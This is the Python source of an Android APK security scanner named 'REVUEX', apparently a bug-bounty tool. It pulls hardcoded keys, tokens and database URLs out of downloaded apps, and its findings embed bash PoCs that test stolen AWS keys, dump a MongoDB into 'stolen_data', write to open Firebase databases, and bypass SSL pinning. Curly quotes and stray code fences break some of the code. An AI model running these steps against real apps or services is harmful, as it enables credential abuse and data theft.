#!/usr/bin/env python3
"""
REVUEX - Android APK Analyzer
Mobile Application Security Analysis

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
“””

import requests
import json
import re
import zipfile
import tempfile
import shutil
from pathlib import Path
import subprocess
import os

class APKAnalyzer:
“”“Android APK security analysis”””

```
def __init__(self, target, apk_urls, workspace, delay=2):
    """
    Initialize APK Analyzer
    
    Args:
        target: Target URL/domain
        apk_urls: List of APK URLs or paths
        workspace: Workspace directory
        delay: Delay between requests
    """
    self.target = target if target.startswith('http') else f"https://{target}"
    self.apk_urls = apk_urls if isinstance(apk_urls, list) else [apk_urls]
    self.workspace = Path(workspace)
    self.delay = delay
    
    self.headers = {
        'User-Agent': 'REVUEX-APKAnalyzer/1.0 (Security Research; +https://github.com/G33L0)'
    }
    
    # Patterns for secret detection
    self.secret_patterns = {
        'api_keys': [
            r'api[_-]?key["\s:=]+(["\']?)([a-zA-Z0-9_\-]{20,})\1',
            r'apikey["\s:=]+(["\']?)([a-zA-Z0-9_\-]{20,})\1',
        ],
        'aws_keys': [
            r'AKIA[0-9A-Z]{16}',
            r'aws[_-]?access[_-]?key',
            r'aws[_-]?secret[_-]?key',
        ],
        'tokens': [
            r'token["\s:=]+(["\']?)([a-zA-Z0-9_\-\.]{20,})\1',
            r'auth[_-]?token["\s:=]+(["\']?)([a-zA-Z0-9_\-\.]{20,})\1',
        ],
        'database_urls': [
            r'mongodb(\+srv)?://[^\s"\']+',
            r'mysql://[^\s"\']+',
            r'postgres(?:ql)?://[^\s"\']+',
        ],
        'firebase': [
            r'firebaseio\.com',
            r'firebase[_-]?url',
            r'firebase[_-]?api[_-]?key',
        ],
        'endpoints': [
            r'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"\'<>]*)?',
            r'/api/v?\d+/[a-zA-Z0-9\-_/]+',
        ],
        'keys': [
            r'private[_-]?key',
            r'secret[_-]?key',
            r'encryption[_-]?key',
        ],
        'passwords': [
            r'password["\s:=]+(["\']?)([^\s"\']{6,})\1',
        ],
    }

def scan(self):
    """Scan APK for security issues"""
    vulnerabilities = []
    
    if not self.apk_urls:
        print("            ! No APK URLs provided")
        return vulnerabilities
    
    for apk_url in self.apk_urls[:3]:  # Limit to first 3 APKs
        print(f"            → Analyzing APK: {apk_url}")
        
        # Download APK
        apk_path = self._download_apk(apk_url)
        
        if not apk_path:
            print("            ! Failed to download APK")
            continue
        
        # Extract APK contents
        extract_dir = self._extract_apk(apk_path)
        
        if not extract_dir:
            print("            ! Failed to extract APK")
            continue
        
        # Analyze APK
        apk_vulns = self._analyze_apk(extract_dir, apk_url, apk_path)
        vulnerabilities.extend(apk_vulns)
        
        # Cleanup
        try:
            shutil.rmtree(extract_dir)
            os.remove(apk_path)
        except:
            pass
    
    # Save results
    self._save_results(vulnerabilities)
    
    return vulnerabilities

def _download_apk(self, apk_url):
    """Download APK file"""
    try:
        if apk_url.startswith('http'):
            response = requests.get(
                apk_url,
                headers=self.headers,
                timeout=30,
                stream=True,
                verify=False
            )
            
            if response.status_code == 200:
                # Save to temp file
                temp_file = tempfile.NamedTemporaryFile(
                    delete=False,
                    suffix='.apk'
                )
                
                for chunk in response.iter_content(chunk_size=8192):
                    temp_file.write(chunk)
                
                temp_file.close()
                return temp_file.name
        else:
            # Local file path
            if os.path.exists(apk_url):
                return apk_url
    except Exception as e:
        print(f"            ! Download error: {str(e)}")
    
    return None

def _extract_apk(self, apk_path):
    """Extract APK contents"""
    try:
        # Create temp directory
        extract_dir = tempfile.mkdtemp()
        
        # Extract APK (it's a ZIP file)
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        return extract_dir
    except Exception as e:
        print(f"            ! Extract error: {str(e)}")
        return None

def _analyze_apk(self, extract_dir, apk_url, apk_path):
    """Analyze extracted APK contents"""
    vulnerabilities = []
    
    # 1. Analyze AndroidManifest.xml
    manifest_vulns = self._analyze_manifest(extract_dir, apk_url, apk_path)
    vulnerabilities.extend(manifest_vulns)
    
    # 2. Search for hardcoded secrets
    secret_vulns = self._find_hardcoded_secrets(extract_dir, apk_url, apk_path)
    vulnerabilities.extend(secret_vulns)
    
    # 3. Find API endpoints
    endpoint_vulns = self._find_api_endpoints(extract_dir, apk_url, apk_path)
    vulnerabilities.extend(endpoint_vulns)
    
    # 4. Check for debugging enabled
    debug_vulns = self._check_debug_mode(extract_dir)
    vulnerabilities.extend(debug_vulns)
    
    # 5. Check for SSL pinning
    ssl_vulns = self._check_ssl_pinning(extract_dir, apk_url, apk_path)
    vulnerabilities.extend(ssl_vulns)
    
    # Add source info to all vulnerabilities
    for vuln in vulnerabilities:
        vuln['apk_url'] = apk_url
        vuln['url'] = self.target
    
    return vulnerabilities

def _analyze_manifest(self, extract_dir, apk_url, apk_path):
    """Analyze AndroidManifest.xml"""
    vulnerabilities = []
    
    manifest_path = Path(extract_dir) / "AndroidManifest.xml"
    
    if not manifest_path.exists():
        return vulnerabilities
    
    try:
        # Read manifest (note: it's binary XML, but we can still search)
        with open(manifest_path, 'rb') as f:
            manifest_content = f.read()
        
        # Convert to string for pattern matching
        manifest_str = str(manifest_content)
        
        # Check for debuggable flag
        if 'debuggable' in manifest_str.lower():
            vulnerabilities.append({
                'type': 'Android App Debuggable',
                'severity': 'high',
                'description': 'Application is marked as debuggable in AndroidManifest.xml, allowing attackers to attach debuggers and inspect runtime data',
                'evidence': 'android:debuggable="true" found in AndroidManifest.xml',
                
                # NEW: Steps to Reproduce
                'steps_to_reproduce': [
                    f"Download the APK from {apk_url}",
                    "Extract the APK using: unzip app.apk -d extracted/",
                    "Open AndroidManifest.xml and search for 'debuggable'",
                    "Confirm android:debuggable=\"true\" is present",
                    "Install APK on Android device with ADB debugging enabled",
                    "Attach debugger using: adb jdwp to get process ID",
                    "Connect debugger and inspect runtime memory/variables"
                ],
                
                # NEW: Proof of Concept
                'poc': f"""#!/bin/bash
```

# APK Debuggable - Proof of Concept

# Step 1: Download and extract APK

wget {apk_url} -O app.apk
unzip app.apk -d extracted/

# Step 2: Check AndroidManifest.xml

grep -i “debuggable” extracted/AndroidManifest.xml

# Step 3: Install APK on device

adb install app.apk

# Step 4: Get process ID

PID=$(adb jdwp | tail -1)
echo “App PID: $PID”

# Step 5: Forward debugging port

adb forward tcp:8700 jdwp:$PID

# Step 6: Attach debugger (using jdb)

jdb -attach localhost:8700

# Now you can:

# - Set breakpoints

# - Inspect variables

# - Modify runtime values

# - Bypass security checks

“””,

```
                # NEW: Before/After States
                'before_state': 'AndroidManifest.xml without debuggable flag - app cannot be debugged in production',
                'after_state': 'AndroidManifest.xml with debuggable="true" - attacker can attach debugger and inspect all runtime data',
                
                'attack_path': [
                    'App is debuggable in production build',
                    'Attacker downloads APK and confirms debuggable flag',
                    'Attacker attaches debugger to running app process',
                    'Reads/modifies memory, variables, and execution flow',
                    'Bypasses authentication and security controls',
                    'Extracts sensitive data from memory'
                ],
                'remediation': [
                    'Set android:debuggable="false" for production builds',
                    'Use build variants (debug vs release) with separate configurations',
                    'Implement runtime debugger detection in critical code paths',
                    'Obfuscate code with ProGuard/R8 to make debugging harder',
                    'Add anti-tampering checks to detect modified APKs',
                    'Use SafetyNet/Play Integrity API to verify app integrity'
                ],
                'tags': ['android', 'debug', 'configuration', 'critical']
            })
        
        # Check for backup enabled
        if 'allowBackup' in manifest_str:
            vulnerabilities.append({
                'type': 'Android Backup Enabled',
                'severity': 'medium',
                'description': 'Application allows backup of data via ADB, potentially exposing sensitive information to attackers with physical device access',
                'evidence': 'android:allowBackup="true" found in AndroidManifest.xml',
                
                # NEW: Steps to Reproduce
                'steps_to_reproduce': [
                    f"Download and install APK from {apk_url}",
                    "Enable ADB debugging on Android device",
                    "Connect device via USB and verify: adb devices",
                    "Create backup: adb backup -f backup.ab com.app.package",
                    "Convert backup: dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar",
                    "Extract backup: tar -xvf backup.tar",
                    "Examine extracted data for sensitive information"
                ],
                
                # NEW: PoC
                'poc': f"""#!/bin/bash
```

# Android Backup Extraction PoC

# Install APK

adb install {apk_path}

# Get package name

PACKAGE=$(aapt dump badging {apk_path} | grep package | awk ‘{{print $2}}’ | sed s/name=//g | sed s/\’//g)

echo “Package: $PACKAGE”

# Create backup

adb backup -f backup.ab $PACKAGE

# Convert backup file

dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar

# Extract

tar -xvf backup.tar

# Search for sensitive data

find . -type f -exec grep -l “password\|token\|api” {{}} \;

echo “Backup extracted successfully!”
“””,

```
                'before_state': 'App data cannot be backed up via ADB',
                'after_state': 'Complete app data including databases and shared preferences backed up via ADB',
                
                'attack_path': [
                    'App data can be backed up via ADB',
                    'Attacker with physical device access or malicious USB cable',
                    'Creates full backup of application data',
                    'Extracts backup and analyzes files',
                    'Discovers sensitive data (tokens, keys, user data)',
                    'Uses stolen credentials to access user accounts'
                ],
                'remediation': [
                    'Set android:allowBackup="false" for apps handling sensitive data',
                    'Use android:fullBackupContent XML to exclude sensitive files',
                    'Encrypt all sensitive data before storage',
                    'Implement Android Keystore for secure key storage',
                    'Use EncryptedSharedPreferences for sensitive preferences',
                    'Add backup agent encryption if backup is required'
                ],
                'tags': ['android', 'backup', 'data_exposure']
            })
        
        # Check for exported components
        if 'exported="true"' in manifest_str:
            vulnerabilities.append({
                'type': 'Exported Android Components',
                'severity': 'medium',
                'description': 'Application has exported components (Activities, Services, Receivers) that can be accessed by other apps without authentication',
                'evidence': 'android:exported="true" found in AndroidManifest.xml',
                
                # NEW: Steps to Reproduce
                'steps_to_reproduce': [
                    f"Download and decompile APK from {apk_url}",
                    "Extract AndroidManifest.xml: unzip app.apk AndroidManifest.xml",
                    "Decode manifest: apktool d app.apk",
                    "Search for exported components: grep 'exported=\"true\"' AndroidManifest.xml",
                    "Install APK on device: adb install app.apk",
                    "Invoke exported activity: adb shell am start -n com.package/.ExportedActivity",
                    "Observe unauthorized access to component"
                ],
                
                'poc': """#!/bin/bash
```

# Exported Component PoC

# Extract and decode APK

apktool d app.apk -o decoded/

# Find exported components

echo “=== Exported Activities ===”
grep -A 5 ‘activity.*exported=“true”’ decoded/AndroidManifest.xml

echo “=== Exported Services ===”
grep -A 5 ‘service.*exported=“true”’ decoded/AndroidManifest.xml

echo “=== Exported Receivers ===”
grep -A 5 ‘receiver.*exported=“true”’ decoded/AndroidManifest.xml

# Install app

adb install app.apk

# Try to invoke exported activity

# Replace com.example.app and ExportedActivity with actual values

adb shell am start -n com.example.app/.ExportedActivity

# Try to start exported service

adb shell am startservice -n com.example.app/.ExportedService

# Send broadcast to exported receiver

adb shell am broadcast -a com.example.ACTION -n com.example.app/.ExportedReceiver
“””,

```
                'before_state': 'Components are private and cannot be accessed by other apps',
                'after_state': 'Malicious apps can invoke exported components and trigger unauthorized actions',
                
                'attack_path': [
                    'Exported components accessible by any app',
                    'Malicious app identifies exported components via manifest',
                    'Invokes activities, services, or broadcasts to exported components',
                    'Triggers unauthorized functionality or data leakage',
                    'May bypass authentication or access controls',
                    'Potential privilege escalation or data theft'
                ],
                'remediation': [
                    'Set android:exported="false" for all unnecessary components',
                    'Add permission requirements to exported components',
                    'Use signature-level permissions for inter-app communication',
                    'Validate all inputs to exported components',
                    'Implement authentication checks in exported component code',
                    'Use implicit intents with intent filters instead of explicit exports where possible'
                ],
                'tags': ['android', 'components', 'access_control']
            })
    
    except Exception as e:
        pass
    
    return vulnerabilities

def _find_hardcoded_secrets(self, extract_dir, apk_url, apk_path):
    """Find hardcoded secrets in APK"""
    vulnerabilities = []
    secrets_found = {
        'api_keys': [],
        'aws_keys': [],
        'tokens': [],
        'database_urls': [],
        'firebase': [],
        'passwords': [],
    }
    
    # Search in common locations
    search_paths = [
        Path(extract_dir) / "res" / "values",
        Path(extract_dir) / "assets",
        Path(extract_dir) / "resources.arsc",
    ]
    
    for search_path in search_paths:
        if not search_path.exists():
            continue
        
        # Search all files
        if search_path.is_file():
            files = [search_path]
        else:
            files = list(search_path.rglob('*'))
        
        for file_path in files:
            if not file_path.is_file():
                continue
            
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                
                # Search for secrets
                for secret_type, patterns in self.secret_patterns.items():
                    if secret_type not in secrets_found:
                        secrets_found[secret_type] = []
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            secret = match[1] if isinstance(match, tuple) and len(match) > 1 else match
                            if secret and len(str(secret)) > 10:
                                secrets_found[secret_type].append({
                                    'value': str(secret)[:50],
                                    'file': str(file_path.relative_to(extract_dir))
                                })
            except:
                continue
    
    # Create vulnerabilities for found secrets
    if secrets_found['api_keys']:
        sample_key = secrets_found['api_keys'][0]
        vulnerabilities.append({
            'type': 'Hardcoded API Keys in APK',
            'severity': 'critical',
            'description': f'API keys found hardcoded in Android application resources, allowing attackers to abuse backend services',
            'evidence': f'Found {len(secrets_found["api_keys"])} API keys in: {sample_key["file"]}',
            'secrets': secrets_found['api_keys'][:5],  # First 5
            
            # NEW: Steps to Reproduce
            'steps_to_reproduce': [
                f"Download APK from {apk_url}",
                "Decompile APK using apktool: apktool d app.apk",
                f"Navigate to hardcoded secret location: cat {sample_key['file']}",
                f"Extract API key: {sample_key['value'][:30]}...",
                "Test API key against backend services",
                "Confirm key provides unauthorized access to API"
            ],
            
            'poc': f"""#!/bin/bash
```

# Hardcoded API Key Extraction PoC

# Download and decompile APK

wget {apk_url} -O app.apk
apktool d app.apk -o decompiled/

# Search for API keys

echo “=== Searching for API keys ===”
grep -r “api[*-]\?key” decompiled/res/
grep -r “apikey” decompiled/res/
grep -r “api[*-]\?token” decompiled/assets/

# Extract specific key

API_KEY=$(grep -o “api_key.*[’\"]\([^’\"]*\)” decompiled/{sample_key[‘file’]} | cut -d’\"’ -f2)

echo “Found API Key: $API_KEY”

# Test the key (example)

curl -H “Authorization: Bearer $API_KEY” https://{self.target}/api/test

# Expected: Unauthorized access to backend API

“””,

```
            'before_state': 'API keys secured on backend, not exposed in client code',
            'after_state': f'API keys hardcoded in {sample_key["file"]}, freely accessible to anyone who decompiles APK',
            
            'attack_path': [
                'Decompile APK to extract resources and code',
                'Search for hardcoded API keys in strings.xml, build configs, etc.',
                'Extract API keys from application resources',
                'Use keys to access backend services without authentication',
                'Abuse API quotas, access user data, or modify resources',
                'Potentially cause financial damage or data breaches'
            ],
            'remediation': [
                'NEVER hardcode API keys in mobile applications',
                'Use backend-for-frontend (BFF) pattern - proxy all API calls through your backend',
                'Implement OAuth 2.0 or similar authentication flow',
                'Use certificate pinning to secure client-server communication',
                'Store sensitive keys in Android Keystore with hardware backing',
                'Implement dynamic key retrieval from secure backend services',
                'Use code obfuscation (ProGuard/R8) as additional layer (not primary security)',
                'Rotate exposed keys immediately and monitor for abuse'
            ],
            'tags': ['android', 'hardcoded_secrets', 'critical', 'api_keys']
        })
    
    if secrets_found['aws_keys']:
        sample_aws = secrets_found['aws_keys'][0]
        vulnerabilities.append({
            'type': 'Hardcoded AWS Credentials',
            'severity': 'critical',
            'description': 'AWS access keys found hardcoded in Android application, allowing complete AWS infrastructure compromise',
            'evidence': f'Found {len(secrets_found["aws_keys"])} AWS credentials in application code',
            'secrets': secrets_found['aws_keys'][:3],
            
            'steps_to_reproduce': [
                f"Download and decompile APK from {apk_url}",
                "Search for AWS patterns: grep -r 'AKIA' decompiled/",
                "Extract AWS Access Key ID (starts with AKIA)",
                "Search for corresponding Secret Access Key",
                "Configure AWS CLI: aws configure",
                "Test access: aws s3 ls",
                "Confirm unauthorized access to AWS resources"
            ],
            
            'poc': f"""#!/bin/bash
```

# AWS Credentials Extraction PoC

# Decompile APK

apktool d app.apk

# Search for AWS keys

echo “=== AWS Access Keys ===”
grep -r “AKIA[0-9A-Z]{{16}}” decompiled/

echo “=== AWS Secret Keys ===”
grep -r “aws.*secret” decompiled/

# Extract keys (example)

ACCESS_KEY=“AKIAIOSFODNN7EXAMPLE”
SECRET_KEY=“wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY”

# Test AWS access

export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY

# List S3 buckets

aws s3 ls

# List EC2 instances

aws ec2 describe-instances

# List databases

aws rds describe-db-instances

# Expected: Full access to AWS infrastructure

“””,

```
            'before_state': 'AWS credentials secured with IAM roles and temporary credentials',
            'after_state': 'AWS Access Key and Secret Key hardcoded in APK, granting full infrastructure access',
            
            'attack_path': [
                'Extract AWS credentials from decompiled APK',
                'Configure AWS CLI with stolen credentials',
                'Enumerate accessible AWS resources (S3, EC2, RDS, etc.)',
                'Access sensitive data in S3 buckets',
                'Compromise databases and EC2 instances',
                'Launch new resources causing financial damage',
                'Complete infrastructure takeover'
            ],
            'remediation': [
                'CRITICAL: NEVER embed AWS credentials in mobile apps',
                'Immediately rotate all exposed AWS credentials',
                'Use AWS Cognito for mobile app authentication',
                'Implement temporary credentials with STS (Security Token Service)',
                'Use IAM roles with minimal required permissions',
                'Implement AWS CloudTrail monitoring for suspicious activity',
                'Enable MFA for all AWS accounts',
                'Use AWS Secrets Manager for credential management',
                'Audit all AWS resources for unauthorized access',
                'Set up billing alerts for unusual spending'
            ],
            'tags': ['android', 'aws', 'critical', 'credentials', 'infrastructure']
        })
    
    if secrets_found['database_urls']:
        sample_db = secrets_found['database_urls'][0]
        vulnerabilities.append({
            'type': 'Hardcoded Database URLs',
            'severity': 'high',
            'description': 'Database connection strings found hardcoded in APK, potentially allowing direct database access',
            'evidence': f'Found {len(secrets_found["database_urls"])} database URLs: {sample_db["value"][:40]}...',
            'secrets': secrets_found['database_urls'][:3],
            
            'steps_to_reproduce': [
                f"Download and decompile APK from {apk_url}",
                "Search for database URLs: grep -r 'mongodb://\\|mysql://\\|postgres://' decompiled/",
                f"Extract connection string from {sample_db['file']}",
                "Attempt direct database connection using extracted credentials",
                "Test read/write access to database",
                "Confirm bypassing of application security layer"
            ],
            
            'poc': f"""#!/bin/bash
```

# Database URL Extraction PoC

# Decompile

apktool d app.apk

# Search for DB URLs

echo “=== MongoDB URLs ===”
grep -r “mongodb” decompiled/

echo “=== MySQL URLs ===”
grep -r “mysql://” decompiled/

echo “=== PostgreSQL URLs ===”
grep -r “postgres” decompiled/

# Example: Connect to exposed MongoDB

DB_URL=“mongodb://user:password@host:27017/database”

# Using mongo shell

mongo “$DB_URL”

# Or using mongodump to extract all data

mongodump –uri=”$DB_URL” –out=./stolen_data/

echo “Database dumped successfully!”
“””,

```
            'before_state': 'Database accessible only through application API with authentication',
            'after_state': 'Direct database connection string exposed, allowing complete database access',
            
            'attack_path': [
                'Extract database connection strings from APK',
                'Attempt direct database connections',
                'Bypass all application-level security controls',
                'Read, modify, or delete sensitive user data',
                'Dump entire database contents',
                'Inject malicious data or backdoors',
                'Hold data for ransom or sell on dark web'
            ],
            'remediation': [
                'Never expose database connection strings in mobile apps',
                'Use backend API as the only database access point',
                'Implement proper API authentication (OAuth, JWT)',
                'Use database-level access controls and authentication',
                'Restrict database access to application servers only (IP whitelist)',
                'Use VPN or private networks for database connectivity',
                'Encrypt connection strings if absolutely necessary (not recommended)',
                'Monitor database access logs for suspicious connections',
                'Implement rate limiting on API endpoints'
            ],
            'tags': ['android', 'database', 'hardcoded_secrets', 'data_breach']
        })
    
    if secrets_found['firebase']:
        vulnerabilities.append({
            'type': 'Firebase Configuration Exposed',
            'severity': 'high',
            'description': 'Firebase configuration and API keys found in APK, potentially allowing unauthorized database access',
            'evidence': f'Found {len(secrets_found["firebase"])} Firebase references in application',
            
            'steps_to_reproduce': [
                f"Download APK from {apk_url}",
                "Decompile: apktool d app.apk",
                "Search for Firebase config: grep -r 'firebaseio.com' decompiled/",
                "Extract Firebase database URL and API key",
                "Access Firebase console or use REST API",
                "Test database security rules",
                "Attempt unauthorized read/write operations"
            ],
            
            'poc': """#!/bin/bash
```

# Firebase Exposure PoC

# Extract Firebase config

apktool d app.apk
grep -r “firebaseio.com” decompiled/ > firebase_urls.txt
grep -r “firebase.*api.*key” decompiled/ > firebase_keys.txt

# Example Firebase URL

FIREBASE_URL=“https://myapp-12345.firebaseio.com”

# Test database access (no auth)

curl “$FIREBASE_URL/users.json”

# Test write access

curl -X PUT -d ‘{“hacked”: true}’ “$FIREBASE_URL/test.json”

# If successful, database rules are misconfigured

# Attacker can read/write all data

“””,

```
            'before_state': 'Firebase database secured with proper authentication rules',
            'after_state': 'Firebase config exposed; if rules misconfigured, complete database access granted',
            
            'attack_path': [
                'Extract Firebase configuration from APK',
                'Identify Firebase Realtime Database or Firestore URL',
                'Test database security rules via REST API',
                'If rules are permissive (.read: true, .write: true)',
                'Read all user data from database',
                'Modify or delete database contents',
                'Inject malicious data or payloads'
            ],
            'remediation': [
                'Implement strict Firebase security rules',
                'Never use .read: true or .write: true in production',
                'Require authentication for all database operations',
                'Use Firebase Authentication and validate auth.uid in rules',
                'Implement granular permission rules per data path',
                'Use Firebase App Check to verify requests from genuine apps',
                'Monitor Firebase console for security rule violations',
                'Enable Firebase audit logging',
                'Regularly review and test security rules'
            ],
            'tags': ['android', 'firebase', 'configuration', 'database']
        })
    
    return vulnerabilities

def _find_api_endpoints(self, extract_dir, apk_url, apk_path):
    """Find API endpoints in APK"""
    endpoints = []
    
    # Search for URLs in resources
    search_paths = [
        Path(extract_dir) / "res",
        Path(extract_dir) / "assets",
    ]
    
    for search_path in search_paths:
        if not search_path.exists():
            continue
        
        for file_path in search_path.rglob('*'):
            if not file_path.is_file():
                continue
            
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                
                # Find URLs
                url_pattern = r'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"\'<>]*)?'
                matches = re.findall(url_pattern, content)
                endpoints.extend(matches)
            except:
                continue
    
    if endpoints:
        unique_endpoints = list(set(endpoints))
        return [{
            'type': 'API Endpoints Discovered',
            'severity': 'info',
            'description': f'API endpoints found hardcoded in Android application, revealing backend infrastructure',
            'evidence': f'Found {len(unique_endpoints)} unique endpoints in APK resources',
            'endpoints': unique_endpoints[:20],  # First 20
            
            'steps_to_reproduce': [
                f"Download APK from {apk_url}",
                "Decompile: apktool d app.apk -o decompiled/",
                "Search for URLs: grep -roh 'https\\?://[^\"\\' ]*' decompiled/",
                "Extract unique endpoints",
                "Test each endpoint for vulnerabilities",
                "Check for unauthenticated access or security misconfigurations"
            ],
            
            'poc': f"""#!/bin/bash
```

# API Endpoint Discovery PoC

# Decompile APK

apktool d app.apk -o decompiled/

# Extract all HTTP(S) URLs

echo “=== Discovered API Endpoints ===”
grep -roh ‘https\?://[^\”\’ ]*’ decompiled/ | sort -u > endpoints.txt

# Display endpoints

cat endpoints.txt

# Test each endpoint

while read endpoint; do
echo “Testing: $endpoint”

```
# Test without authentication
curl -i "$endpoint"

# Test common paths
curl -i "$endpoint/admin"
curl -i "$endpoint/api/users"
curl -i "$endpoint/.git/config"
```

done < endpoints.txt

# Check for exposed sensitive endpoints

# Expected: Discovery of internal APIs, admin panels, debug endpoints

“””,

```
            'before_state': 'API endpoints discovered through authorized security testing',
            'after_state': f'{len(unique_endpoints)} backend API endpoints extracted from APK for targeted testing',
            
            'attack_path': [
                'Extract all API endpoints from decompiled APK',
                'Reverse engineer API structure and parameters',
                'Test endpoints for vulnerabilities (SQLi, XSS, IDOR, etc.)',
                'Find unauthenticated or weakly authenticated endpoints',
                'Discover debug or admin endpoints',
                'Identify deprecated or forgotten API versions',
                'Exploit discovered vulnerabilities for unauthorized access'
            ],
            'remediation': [
                'Implement proper API authentication on all endpoints',
                'Use API rate limiting to prevent abuse',
                'Validate and sanitize all API inputs',
                'Disable or properly secure debug endpoints in production',
                'Use API versioning and deprecate old insecure versions',
                'Implement API monitoring for anomalous usage patterns',
                'Consider API endpoint obfuscation (not primary security)',
                'Use web application firewall (WAF) for API protection',
                'Regular security testing of all discovered endpoints'
            ],
            'tags': ['android', 'api', 'reconnaissance', 'endpoints']
        }]
    
    return []

def _check_debug_mode(self, extract_dir):
    """Check for debug mode indicators"""
    # This is checked in manifest, but also look for other indicators
    return []

def _check_ssl_pinning(self, extract_dir, apk_url, apk_path):
    """Check for SSL certificate pinning implementation"""
    vulnerabilities = []
    
    # Search for SSL/TLS related code
    has_pinning = False
    
    search_paths = [Path(extract_dir)]
    
    for search_path in search_paths:
        if not search_path.exists():
            continue
        
        for file_path in search_path.rglob('*'):
            if not file_path.is_file():
                continue
            
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                
                # Look for certificate pinning indicators
                pinning_patterns = [
                    'CertificatePinner',
                    'TrustManager',
                    'X509TrustManager',
                    'checkServerTrusted',
                    'pinnedCertificates',
                ]
                
                for pattern in pinning_patterns:
                    if pattern in content:
                        has_pinning = True
                        break
                
                if has_pinning:
                    break
            except:
                continue
        
        if has_pinning:
            break
    
    if not has_pinning:
        vulnerabilities.append({
            'type': 'Missing SSL Certificate Pinning',
            'severity': 'medium',
            'description': 'Application does not implement SSL certificate pinning, making it vulnerable to man-in-the-middle attacks',
            'evidence': 'No certificate pinning implementation detected in APK code',
            
            'steps_to_reproduce': [
                f"Download and install APK from {apk_url}",
                "Install Burp Suite CA certificate on Android device",
                "Configure device proxy to point to Burp Suite",
                "Launch the application",
                "Observe that HTTPS traffic is successfully intercepted",
                "Confirm no certificate pinning errors occur",
                "View decrypted API requests/responses in Burp Suite"
            ],
            
            'poc': """#!/bin/bash
```

# SSL Pinning Check PoC

# Step 1: Setup

# Install Burp Suite and export CA certificate

# Transfer certificate to Android device

adb push burp-ca-cert.cer /sdcard/

# Step 2: Install certificate on device

# Settings > Security > Install from storage > burp-ca-cert.cer

# Step 3: Configure proxy

adb shell settings put global http_proxy <burp-ip>:8080

# Step 4: Install and launch app

adb install app.apk
adb shell am start -n com.example.app/.MainActivity

# Step 5: Monitor Burp Suite

# If you see HTTPS traffic, SSL pinning is NOT implemented

# Step 6: Test with Frida (alternative method)

frida -U -f com.example.app -l ssl-unpinning-script.js

# If app connects successfully, pinning is missing or bypassable

“””,

```
            'before_state': 'SSL certificate pinning implemented - MITM attacks fail with certificate validation errors',
            'after_state': 'No SSL pinning - attacker can intercept and decrypt all HTTPS traffic',
            
            'attack_path': [
                'Attacker sets up man-in-the-middle (MITM) proxy',
                'Installs rogue CA certificate on target device',
                'Routes app traffic through MITM proxy',
                'Successfully intercepts all HTTPS communications',
                'Reads sensitive data in transit (passwords, tokens, PII)',
                'Modifies API requests/responses',
                'Performs session hijacking or credential theft'
            ],
            'remediation': [
                'Implement SSL certificate pinning using Android Network Security Config',
                'Pin to specific certificates or public keys',
                'Use libraries like OkHttp CertificatePinner or TrustKit',
                'Implement backup pins for certificate rotation',
                'Add anti-tampering detection for SSL pinning bypass attempts',
                'Monitor for SSL pinning failures and alert users',
                'Use SafetyNet/Play Integrity to detect rooted devices',
                'Implement additional encryption layer for sensitive data',
                'Test pinning implementation against common bypass tools (Frida, Xposed)'
            ],
            'tags': ['android', 'ssl', 'mitm', 'network_security']
        })
    
    return vulnerabilities

def _save_results(self, vulnerabilities):
    """Save APK analysis results"""
    apk_dir = self.workspace / "apk_analysis"
    apk_dir.mkdir(exist_ok=True)
    
    output_file = apk_dir / "apk_vulnerabilities.json"
    with open(output_file, 'w') as f:
        json.dump({
            'target': self.target,
            'apks_analyzed': len(self.apk_urls),
            'vulnerabilities': vulnerabilities
        }, f, indent=2)
```